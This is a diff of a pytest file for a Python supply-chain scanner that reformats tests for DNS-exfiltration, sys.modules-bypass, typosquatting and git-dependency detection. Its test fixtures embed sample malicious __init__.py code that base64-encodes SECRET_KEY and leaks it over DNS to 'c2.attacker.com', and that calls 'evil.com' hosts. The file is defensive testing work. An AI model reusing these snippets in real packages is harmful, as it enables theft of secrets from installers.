@@ -6,16 +6,16 @@ Tests for all fixes from the multi-angle review:
   - P1: Typosquatting detection
   - P1: Git dependency flagging in lockfile
 """
-import pytest
-import zipfile
+
 import tempfile
+import zipfile
 from pathlib import Path
 
-from chaincanary.models import RiskReport, Finding, Severity
+from chaincanary.analyzer.pth_analyzer import PthClass, analyze_pth_content
 from chaincanary.analyzer.static import StaticAnalyzer
-from chaincanary.analyzer.pth_analyzer import analyze_pth_content, PthClass
-from chaincanary.safety_checks import check_typosquatting
 from chaincanary.lockfile import parse_requirements_txt
+from chaincanary.models import Finding, RiskReport, Severity
+from chaincanary.safety_checks import check_typosquatting
 
 
 def make_wheel(name: str, version: str, files: dict) -> Path:
@@ -31,6 +31,7 @@ def make_wheel(name: str, version: str, files: dict) -> Path:
 # P0-1: Scoring System
 # ═══════════════════════════════════════════════════════════════════
 
+
 class TestScoringSystem:
     """Verify the fixed scoring model."""
 
@@ -44,9 +45,7 @@ class TestScoringSystem:
     def test_single_critical_is_high_risk_not_low_risk(self):
         """BUG FIX: 1×CRITICAL must be HIGH_RISK (was LOW_RISK before fix)."""
         r = self._report([Severity.CRITICAL])
-        assert r.verdict == "HIGH_RISK", (
-            f"Single CRITICAL must be HIGH_RISK, got {r.verdict}"
-        )
+        assert r.verdict == "HIGH_RISK", f"Single CRITICAL must be HIGH_RISK, got {r.verdict}"
 
     def test_two_critical_is_malicious(self):
         r = self._report([Severity.CRITICAL, Severity.CRITICAL])
@@ -111,20 +110,24 @@ class TestScoringSystem:
 # P0-2: DNS Exfiltration & sys.modules Detection
 # ═══════════════════════════════════════════════════════════════════
 
-class TestDNSExfilAndBypassDetection:
 
+class TestDNSExfilAndBypassDetection:
     def setup_method(self):
         self.static = StaticAnalyzer()
 
     def test_socket_getaddrinfo_in_init_detected(self):
         """DNS exfil via socket.getaddrinfo must be caught."""
-        whl = make_wheel("evil", "1.0.0", {
-            "evil/__init__.py": (
-                "import socket, os, base64\n"
-                "hostname = base64.b64encode(os.environ.get('SECRET_KEY','').encode()).decode()\n"
-                "socket.getaddrinfo(hostname[:50]+'.c2.attacker.com', 80)\n"
-            ),
-        })
+        whl = make_wheel(
+            "evil",
+            "1.0.0",
+            {
+                "evil/__init__.py": (
+                    "import socket, os, base64\n"
+                    "hostname = base64.b64encode(os.environ.get('SECRET_KEY','').encode()).decode()\n"
+                    "socket.getaddrinfo(hostname[:50]+'.c2.attacker.com', 80)\n"
+                ),
+            },
+        )
         findings = self.static.analyze_wheel(whl)
         rule_ids = [f.rule_id for f in findings]
         assert "DNS_EXFIL" in rule_ids, (
@@ -133,21 +136,28 @@ class TestDNSExfilAndBypassDetection:
 
     def test_socket_gethostbyname_in_init_detected(self):
         """DNS exfil via socket.gethostbyname must be caught."""
-        whl = make_wheel("evil", "1.0.0", {
-            "evil/__init__.py": (
-                "import socket\n"
-                "socket.gethostbyname('stolen-data.evil.com')\n"
-            ),
-        })
+        whl = make_wheel(
+            "evil",
+            "1.0.0",
+            {
+                "evil/__init__.py": (
+                    "import socket\nsocket.gethostbyname('stolen-data.evil.com')\n"
+                ),
+            },
+        )
         findings = self.static.analyze_wheel(whl)
         rule_ids = [f.rule_id for f in findings]
         assert "DNS_EXFIL" in rule_ids
 
     def test_dns_exfil_severity_is_high(self):
         """DNS exfil should be HIGH severity."""
-        whl = make_wheel("evil", "1.0.0", {
-            "evil/__init__.py": "import socket; socket.getaddrinfo('evil.com', 80)",
-        })
+        whl = make_wheel(
+            "evil",
+            "1.0.0",
+            {
+                "evil/__init__.py": "import socket; socket.getaddrinfo('evil.com', 80)",
+            },
+        )
         findings = self.static.analyze_wheel(whl)
         dns_finding = next((f for f in findings if f.rule_id == "DNS_EXFIL"), None)
         assert dns_finding is not None
@@ -155,33 +165,43 @@ class TestDNSExfilAndBypassDetection:
 
     def test_sys_modules_access_detected(self):
         """sys.modules[] indirect access must be flagged."""
-        whl = make_wheel("evil", "1.0.0", {
-            "evil/__init__.py": (
-                "import sys\n"
-                "if 'requests' in sys.modules:\n"
-                "    sys.modules['requests'].get('http://c2.evil.com')\n"
-            ),
-        })
+        whl = make_wheel(
+            "evil",
+            "1.0.0",
+            {
+                "evil/__init__.py": (
+                    "import sys\n"
+                    "if 'requests' in sys.modules:\n"
+                    "    sys.modules['requests'].get('http://c2.evil.com')\n"
+                ),
+            },
+        )
         findings = self.static.analyze_wheel(whl)
         rule_ids = [f.rule_id for f in findings]
-        assert "SYS_MODULES_ACCESS" in rule_ids, (
-            f"sys.modules bypass not detected. Got: {rule_ids}"
-        )
+        assert "SYS_MODULES_ACCESS" in rule_ids, f"sys.modules bypass not detected. Got: {rule_ids}"
 
     def test_sys_modules_get_detected(self):
-        whl = make_wheel("evil", "1.0.0", {
-            "evil/__init__.py": "import sys; m = sys.modules.get('urllib.request'); m.urlopen('http://evil.com')",
-        })
+        whl = make_wheel(
+            "evil",
+            "1.0.0",
+            {
+                "evil/__init__.py": "import sys; m = sys.modules.get('urllib.request'); m.urlopen('http://evil.com')",
+            },
+        )
         findings = self.static.analyze_wheel(whl)
         rule_ids = [f.rule_id for f in findings]
         assert "SYS_MODULES_ACCESS" in rule_ids
 
     def test_clean_socket_use_not_flagged_in_non_init(self):
         """socket usage in non-init files should not trigger DNS_EXFIL."""
-        whl = make_wheel("mylib", "1.0.0", {
-            "mylib/__init__.py": "# clean",
-            "mylib/server.py": "import socket\ns = socket.socket()\ns.bind(('0.0.0.0', 8080))",
-        })
+        whl = make_wheel(
+            "mylib",
+            "1.0.0",
+            {
+                "mylib/__init__.py": "# clean",
+                "mylib/server.py": "import socket\ns = socket.socket()\ns.bind(('0.0.0.0', 8080))",
+            },
+        )
         findings = self.static.analyze_wheel(whl)
         dns = [f for f in findings if f.rule_id == "DNS_EXFIL"]
         assert dns == [], f"False positive DNS_EXFIL in non-init: {dns}"
@@ -197,8 +217,8 @@ class TestDNSExfilAndBypassDetection:
 # P1: Typosquatting Detection
 # ═══════════════════════════════════════════════════════════════════
 
-class TestTyposquatting:
 
+class TestTyposquatting:
     def test_reqeusts_is_typosquat_of_requests(self):
         """'reqeusts' (transposed) should be flagged."""
         result = check_typosquatting("reqeusts")
@@ -252,8 +272,8 @@ class TestTyposquatting:
 # P1: Git Dependencies
 # ═══════════════════════════════════════════════════════════════════
 
-class TestGitDependencies:
 
+class TestGitDependencies:
     def test_git_dep_parsed(self):
         """git+https:// line should be parsed as is_git_dep=True."""
         content = (
@@ -297,6 +317,7 @@ class TestGitDependencies:
 # Regression: make sure prior tests still pass after fixes
 # ═══════════════════════════════════════════════════════════════════
 
+
 class TestRegressionAfterFixes:
     """Ensure previous fixes didn't break anything."""
 
@@ -304,8 +325,10 @@ class TestRegressionAfterFixes:
         self.static = StaticAnalyzer()
 
     def test_litellm_attack_still_malicious(self):
-        from tests.fixtures.mock_packages import create_mock_litellm_attack
         import tempfile
+
+        from tests.fixtures.mock_packages import create_mock_litellm_attack
+
         d = Path(tempfile.mkdtemp())
         whl = create_mock_litellm_attack(d)
         findings = self.static.analyze_wheel(whl, "litellm")
@@ -315,22 +338,30 @@ class TestRegressionAfterFixes:
         assert r.score == 10.0
 
     def test_empty_pth_still_silent(self):
-        whl = make_wheel("pytest-cov", "4.0.0", {
-            "pytest_cov/__init__.py": "# ok",
-            "pytest-cov.pth": "",
-        })
+        whl = make_wheel(
+            "pytest-cov",
+            "4.0.0",
+            {
+                "pytest_cov/__init__.py": "# ok",
+                "pytest-cov.pth": "",
+            },
+        )
         findings = self.static.analyze_wheel(whl)
         assert findings == []
 
     def test_setuptools_shim_still_low(self):
-        whl = make_wheel("setuptools", "69.0.0", {
-            "setuptools/__init__.py": "# ok",
-            "distutils-precedence.pth": (
-                "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; "
-                "enabled = os.environ.get(var, 'local') == 'local'; "
-                "enabled and __import__('_distutils_hack').add_shim()"
-            ),
-        })
+        whl = make_wheel(
+            "setuptools",
+            "69.0.0",
+            {
+                "setuptools/__init__.py": "# ok",
+                "distutils-precedence.pth": (
+                    "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; "
+                    "enabled = os.environ.get(var, 'local') == 'local'; "
+                    "enabled and __import__('_distutils_hack').add_shim()"
+                ),
+            },
+        )
         findings = self.static.analyze_wheel(whl, "setuptools")
         criticals = [f for f in findings if f.severity == Severity.CRITICAL]
         assert criticals == []
